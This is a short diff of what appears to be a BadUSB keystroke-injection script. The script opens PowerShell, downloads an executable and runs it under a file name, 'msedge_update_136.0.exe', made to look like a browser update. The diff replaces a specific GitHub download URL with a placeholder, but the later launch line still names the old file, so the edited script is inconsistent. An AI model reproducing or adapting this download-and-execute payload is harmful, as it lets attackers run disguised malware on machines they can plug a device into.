@@ -26,7 +26,7 @@ DELAY 440
 STRING powershell
 ENTER 
 DELAY 499
-STRING Invoke-WebRequest "https://github.com/biskit-git/testing/raw/refs/heads/main/msedge_update_136.0.exe" -OutFile "msedge_update_136.0.exe"
+STRING Invoke-WebRequest "your download url" -OutFile "your.exe"
 ENTER
 DELAY 799
 STRING start msedge_update_136.0.exe
